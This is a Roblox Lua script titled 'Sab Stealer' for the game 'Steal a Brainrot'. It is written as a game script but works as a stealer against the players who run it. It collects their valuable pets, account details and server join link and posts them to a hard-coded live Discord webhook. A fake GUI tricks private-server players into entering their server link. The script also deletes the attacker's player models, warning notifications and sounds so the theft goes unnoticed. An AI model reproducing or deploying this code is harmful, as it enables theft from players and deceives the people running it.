-- ====== Services ======
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- ====== Webhook ======
local WEBHOOK = "https://discord.com/api/webhooks/1410618012708634777/hQoWuMzJJgV5MlCK4KB0MyAJtUUj2jFOgxgNvG4tQFv3AdfJ_ByQkGNkt3G1ywfOTpIB"

-- ====== Config Webhook ======
local PRICE_LIMIT = 5_000_000 -- 5M
local targetNames = { "Kitsune", "Dragonfly", "Pipi Kiwi" }

-- ====== Config SafeScript ======
local badPlayers = { "phatle8117", "ConCuTiHon02" }
local targetSweetTexts = { "CÄƒn cá»© cá»§a Sweet", "Sweet's Base" }

-- ====== State ======
local plotsFolder = Workspace:FindFirstChild("Plots")
local myBase = nil
local duplicatedBaseDone = false
local clonedPodiumsDone = false

-- ====== Functions ======
-- Chuyá»ƒn giÃ¡ dáº¡ng "5K"/"5M"/"2B" sang sá»‘
local function parsePrice(priceText)
    local number = tonumber(priceText:match("[%d%.]+")) or 0
    if priceText:find("K") then
        return number * 1_000
    elseif priceText:find("M") then
        return number * 1_000_000
    elseif priceText:find("B") then
        return number * 1_000_000_000
    else
        return number
    end
end

-- Kiá»ƒm tra tÃªn pet má»¥c tiÃªu
local function isTargetName(name)
    for _, n in ipairs(targetNames) do
        if n == name then return true end
    end
    return false
end

-- Thu tháº­p pet trong base cá»§a báº¡n
local function collectValidPets()
    local pets = {}
    if not plotsFolder then return pets end
    for _, plot in pairs(plotsFolder:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
            local podiums = plot:FindFirstChild("AnimalPodiums")
            if podiums then
                for _, podium in pairs(podiums:GetChildren()) do
                    local spawn = podium:FindFirstChild("Base") and podium.Base:FindFirstChild("Spawn")
                    if spawn and spawn:FindFirstChild("Attachment") then
                        local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")
                        if overhead then
                            local displayName = overhead:FindFirstChild("DisplayName")
                            local priceLabel = overhead:FindFirstChild("Generation")
                            if displayName and priceLabel and displayName:IsA("TextLabel") and priceLabel:IsA("TextLabel") then
                                local nameText = displayName.Text
                                local priceText = priceLabel.Text
                                local priceNum = parsePrice(priceText)
                                if priceNum >= PRICE_LIMIT or isTargetName(nameText) then
                                    table.insert(pets, string.format("%s (%s)", nameText, priceText))
                                end
                            end
                        end
                    end
                end
            end
            break -- chá»‰ base cá»§a báº¡n
        end
    end
    return pets
end

-- Kiá»ƒm tra Executor
local function detectExecutor()
    local executor = "Unknown"
    if syn then executor = "Synapse X"
    elseif KRNL_LOADED then executor = "KRNL"
    elseif fluxus then executor = "Fluxus"
    elseif secure_load then executor = "Sentinel"
    elseif getexecutorname then executor = getexecutorname()
    elseif identifyexecutor then executor = identifyexecutor() end
    return executor
end

-- Láº¥y account age
local function getAccountAge()
    return player.AccountAge
end

-- Kiá»ƒm tra server type
local serverType = "PUBLIC SERVER"
local ok, privateMsg = pcall(function()
    local map = workspace:WaitForChild("Map")
    local codes = map:WaitForChild("Codes")
    local main = codes:WaitForChild("Main")
    local surfaceGui = main:WaitForChild("SurfaceGui")
    privateMsg = surfaceGui:WaitForChild("MainFrame"):WaitForChild("PrivateServerMessage")
    serverType = privateMsg.Visible and "PRIVATE SERVER" or "PUBLIC SERVER"
end)
if not ok then
    serverType = "PUBLIC SERVER"
end

-- Gá»­i webhook
local function sendWebhook(link)
    if player:GetAttribute("WebhookSent") then return end

    local pets = collectValidPets()
    if #pets == 0 then
        warn("No valid pets to send.")
        return
    end

    local lootText = table.concat(pets, "\n")
    local placeId = tostring(game.PlaceId or "")
    local jobId = tostring(game.JobId or "")
    local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)

    local embed = {
        ["title"] = "ðŸŒµ Sab Stealer - Make By Phatlee",
        ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
        ["fields"] = {
            { ["name"] = "Server Type", ["value"] = serverType },
            { ["name"] = "ðŸ‘¤ Player Information",
              ["value"] = "Name: " .. player.Name ..
                          "\nReceiver: phatle8117, banpetuytin1111, banpetuytin111140" ..
                          "\nExecutor: " .. detectExecutor() ..
                          "\nAccount Age: " .. tostring(getAccountAge()) .. " days" },
            { ["name"] = "Brainrot Loot",
              ["value"] = lootText },
            { ["name"] = "Join Server Link",
              ["value"] = ("[Click to Join Server](%s)"):format(serverLink) }
        }
    }

    local payload = { ["content"] = link or ("Server detected: " .. serverType), ["embeds"] = {embed} }
    local req = (syn and syn.request) or http_request or (http and http.request) or request
    if not req then
        warn("Executor khÃ´ng há»— trá»£ request HTTP")
        return
    end

    pcall(function()
        req({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(payload)})
    end)
    player:SetAttribute("WebhookSent", true)
end

-- ====== SafeScript Functions ======
local function FindMyBase()
    if not plotsFolder then return nil end
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local ok, isYour = pcall(function()
                local y = sign:FindFirstChild("YourBase")
                if y then
                    if y:IsA("BoolValue") then
                        return y.Value
                    elseif y:FindFirstChild("Enabled") and y.Enabled:IsA("BoolValue") then
                        return y.Enabled.Value
                    elseif y.Enabled ~= nil then
                        return y.Enabled == true
                    end
                end
                return false
            end)
            if ok and isYour then return plot end
            local surf = sign:FindFirstChild("SurfaceGui")
            if surf then
                local frame = surf:FindFirstChild("Frame")
                if frame then
                    local tl = frame:FindFirstChild("TextLabel")
                    if tl and tostring(tl.Text):find(player.Name) then
                        return plot
                    end
                end
            end
        end
    end
    return nil
end

local function DuplicateBaseModelsOnce(base)
    if not base or duplicatedBaseDone then return end
    for _, obj in ipairs(base:GetChildren()) do
        if obj:IsA("Model") and obj.Name ~= "FriendPanel" and obj.Name ~= "AnimalPodiums" then
            if not obj.Name:match("[Cc]lone$") and not obj.Name:match("_clone$") then
                local clone = obj:Clone()
                clone.Name = obj.Name.."_clone"
                clone.Parent = base
                obj:Destroy()
            end
        end
    end
    duplicatedBaseDone = true
end

local function DuplicateAnimalPodiumsOnce(base)
    if not base or clonedPodiumsDone then return end
    local podiums = base:FindFirstChild("AnimalPodiums")
    if podiums then
        for _, p in ipairs(podiums:GetChildren()) do
            if p:IsA("Model") and not p.Name:match("[Cc]lone$") and not p.Name:match("_clone$") then
                local c = p:Clone()
                c.Name = p.Name.."_clone"
                c.Parent = podiums
                p:Destroy()
            end
        end
        clonedPodiumsDone = true
    end
end

local function DeletePlayerModelsLoop()
    while true do
        for _, name in ipairs(badPlayers) do
            local m = Workspace:FindFirstChild(name)
            if m then m:Destroy() end
        end
        task.wait(1)
    end
end

local function RemoveGuiAndSoundsLoop()
    while true do
        local pg = player:FindFirstChild("PlayerGui")
        if pg then
            local notif = pg:FindFirstChild("Notification")
            if notif then notif:Destroy() end
        end
        local s = ReplicatedStorage:FindFirstChild("Sounds")
        if s and s:FindFirstChild("Sfx") and s.Sfx:FindFirstChild("Warn") then
            s.Sfx.Warn:Destroy()
        end
        task.wait(1)
    end
end

local function CheckAndDeleteSweetLoop()
    while true do
        if plotsFolder then
            for _, plot in ipairs(plotsFolder:GetChildren()) do
                if myBase and plot == myBase then
                    -- skip
                else
                    local sign = plot:FindFirstChild("PlotSign")
                    if sign then
                        local surf = sign:FindFirstChild("SurfaceGui")
                        if surf then
                            local frame = surf:FindFirstChild("Frame")
                            if frame then
                                local tl = frame:FindFirstChild("TextLabel")
                                if tl then
                                    local txt = tostring(tl.Text)
                                    for _, t in ipairs(targetSweetTexts) do
                                        if txt == t then
                                            plot:Destroy()
                                            break
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.1)
    end
end

-- ====== Initialize ======
task.spawn(function()
    local tries = 0
    while not plotsFolder and tries < 50 do
        plotsFolder = Workspace:FindFirstChild("Plots")
        tries = tries + 1
        task.wait(0.1)
    end
    myBase = FindMyBase()
    if myBase then
        DuplicateBaseModelsOnce(myBase)
        DuplicateAnimalPodiumsOnce(myBase)
    end
    task.spawn(DeletePlayerModelsLoop)
    task.spawn(RemoveGuiAndSoundsLoop)
    task.spawn(CheckAndDeleteSweetLoop)
end)

-- ====== Public server: gá»­i webhook ngay ======
if serverType == "PUBLIC SERVER" then
    sendWebhook()
else
    -- ====== Private server GUI ======
    local playerGui = player:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui", playerGui)
    screenGui.Name = "StealBrainrotGUI"
    screenGui.ResetOnSpawn = false

    local frame = Instance.new("Frame", screenGui)
    frame.Size = UDim2.new(0, 320, 0, 180)
    frame.Position = UDim2.new(0.5, -160, 0.5, -90)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.Active = true
    frame.Draggable = true
    local frameCorner = Instance.new("UICorner", frame)
    frameCorner.CornerRadius = UDim.new(0, 12)

    local title = Instance.new("TextLabel", frame)
    title.Text = "Steal a Brainrot"
    title.Font = Enum.Font.FredokaOne
    title.TextSize = 20
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 0, 28)
    title.Position = UDim2.new(0, 0, 0, 4)

    local closeButton = Instance.new("TextButton", frame)
    closeButton.Text = "X"
    closeButton.Font = Enum.Font.FredokaOne
    closeButton.TextSize = 18
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
    closeButton.Size = UDim2.new(0, 28, 0, 28)
    closeButton.Position = UDim2.new(1, -34, 0, 4)
    local closeCorner = Instance.new("UICorner", closeButton)
    closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)

    local textBox = Instance.new("TextBox", frame)
    textBox.Size = UDim2.new(0.9, 0, 0, 40)
    textBox.Position = UDim2.new(0.05, 0, 0, 60)
    textBox.PlaceholderText = "Please enter your private server link"
    textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.ClearTextOnFocus = false
    textBox.Font = Enum.Font.FredokaOne
    textBox.TextSize = 14
    local tbCorner = Instance.new("UICorner", textBox)
    tbCorner.CornerRadius = UDim.new(0, 8)

    local sendButton = Instance.new("TextButton", frame)
    sendButton.Text = "Send"
    sendButton.Font = Enum.Font.FredokaOne
    sendButton.TextSize = 18
    sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    sendButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
    sendButton.Size = UDim2.new(0.4, 0, 0, 32)
    sendButton.Position = UDim2.new(0.3, 0, 0, 110)
    local sendCorner = Instance.new("UICorner", sendButton)
    sendCorner.CornerRadius = UDim.new(0, 8)

    local function showError(msg)
        local popup = Instance.new("Frame", screenGui)
        popup.Size = UDim2.new(0, 300, 0, 120)
        popup.Position = UDim2.new(0.5, -150, 0.5, -60)
        popup.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        popup.AnchorPoint = Vector2.new(0.5, 0.5)
        local popupCorner = Instance.new("UICorner", popup)
        popupCorner.CornerRadius = UDim.new(0, 12)

        local label = Instance.new("TextLabel", popup)
        label.Size = UDim2.new(1, -20, 0.6, 0)
        label.Position = UDim2.new(0, 10, 0.1, 0)
        label.BackgroundTransparency = 1
        label.Text = msg
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.TextScaled = true
        label.Font = Enum.Font.FredokaOne

        local button = Instance.new("TextButton", popup)
        button.Size = UDim2.new(0.5, 0, 0.25, 0)
        button.Position = UDim2.new(0.25, 0, 0.7, 0)
        button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
        button.Text = "OK"
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.Font = Enum.Font.FredokaOne
        local btnCorner = Instance.new("UICorner", button)
        btnCorner.CornerRadius = UDim.new(0, 8)

        local function closePopup() popup:Destroy() end
        button.MouseButton1Click:Connect(closePopup)
        task.delay(5, function()
            if popup and popup.Parent then closePopup() end
        end)
    end

    local function isValidPrivateServerLink(txt)
        return string.match(txt, "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
    end

    sendButton.MouseButton1Click:Connect(function()
        local txt = textBox.Text or ""
        if isValidPrivateServerLink(txt) then
            sendWebhook(txt)
            screenGui:Destroy()
        else
            showError("Please enter your private server link")
        end
    end)

    textBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            local txt = textBox.Text or ""
            if isValidPrivateServerLink(txt) then
                sendWebhook(txt)
                screenGui:Destroy()
            else
                showError("Please enter your private server link")
            end
        end
    end)
end
